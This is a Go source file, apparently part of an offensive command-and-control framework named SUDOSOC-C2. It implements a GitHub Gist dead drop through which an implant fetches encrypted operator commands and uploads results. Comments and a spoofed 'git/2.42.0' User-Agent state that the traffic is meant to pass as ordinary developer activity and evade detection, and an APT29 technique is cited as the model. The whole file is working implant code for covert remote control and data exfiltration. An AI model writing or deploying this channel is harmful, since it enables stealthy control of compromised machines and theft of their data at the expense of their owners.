package deadrop

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	GitHub Gist dead drop provider.

	Command drop: operator creates/updates a secret Gist with the encrypted command.
	Response drop: implant updates a second Gist with the encrypted result.

	Gist IDs are embedded at compile time. The implant only makes standard
	HTTPS calls to api.github.com — indistinguishable from any developer tool.

	Traffic fingerprint:
	  GET  https://api.github.com/gists/<cmd_gist_id>
	  PATCH https://api.github.com/gists/<resp_gist_id>
	  Both with Authorization: token <github_pat>

	Real-world usage (APT29/Cozy Bear used Twitter as a dead drop;
	this is the same concept with GitHub's more reliable API).
*/

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"time"
)

// GitHubGistProvider implements the Provider interface using GitHub Gists.
type GitHubGistProvider struct {
	// PAT is the GitHub Personal Access Token (read gists scope).
	PAT string
	// CmdGistID is the Gist ID the operator writes commands to.
	CmdGistID string
	// RespGistID is the Gist ID the implant writes results to.
	RespGistID string
	// CmdFilename is the filename within the cmd Gist.
	CmdFilename string
	// RespFilename is the filename within the resp Gist.
	RespFilename string

	client    *http.Client
	lastETag  string
}

// NewGitHubProvider creates a GitHub Gist dead drop provider.
func NewGitHubProvider(pat, cmdGistID, respGistID string) *GitHubGistProvider {
	return &GitHubGistProvider{
		PAT:          pat,
		CmdGistID:    cmdGistID,
		RespGistID:   respGistID,
		CmdFilename:  "config.json",
		RespFilename: "result.json",
		client:       &http.Client{Timeout: 15 * time.Second},
	}
}

func (g *GitHubGistProvider) Name() string { return "GitHub-Gist" }

func (g *GitHubGistProvider) IsConfigured() bool {
	return g.PAT != "" && g.CmdGistID != ""
}

// ReadCommand fetches the command Gist content.
// Uses conditional GET (ETag) to avoid re-processing the same command.
func (g *GitHubGistProvider) ReadCommand(ctx context.Context, _ string) ([]byte, error) {
	url := "https://api.github.com/gists/" + g.CmdGistID
	req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Authorization", "token "+g.PAT)
	req.Header.Set("Accept", "application/vnd.github.v3+json")
	req.Header.Set("User-Agent", "git/2.42.0") // blend in as git client
	if g.lastETag != "" {
		req.Header.Set("If-None-Match", g.lastETag)
	}

	resp, err := g.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode == 304 {
		return nil, nil // not modified
	}
	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("GitHub API %d", resp.StatusCode)
	}
	g.lastETag = resp.Header.Get("ETag")

	body, err := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	if err != nil {
		return nil, err
	}

	// Parse Gist JSON and extract file content.
	var gist struct {
		Files map[string]struct {
			Content string `json:"content"`
		} `json:"files"`
	}
	if err := json.Unmarshal(body, &gist); err != nil {
		return nil, err
	}
	fname := g.CmdFilename
	if f, ok := gist.Files[fname]; ok && f.Content != "" {
		return []byte(f.Content), nil
	}
	return nil, nil
}

// WriteResult updates the response Gist with the encrypted result.
func (g *GitHubGistProvider) WriteResult(ctx context.Context, _ string, result []byte) error {
	payload := map[string]interface{}{
		"files": map[string]interface{}{
			g.RespFilename: map[string]string{
				"content": string(result),
			},
		},
	}
	body, _ := json.Marshal(payload)
	url := "https://api.github.com/gists/" + g.RespGistID
	req, err := http.NewRequestWithContext(ctx, "PATCH", url, bytes.NewReader(body))
	if err != nil {
		return err
	}
	req.Header.Set("Authorization", "token "+g.PAT)
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Accept", "application/vnd.github.v3+json")
	req.Header.Set("User-Agent", "git/2.42.0")

	resp, err := g.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		return fmt.Errorf("GitHub PATCH %d", resp.StatusCode)
	}
	return nil
}
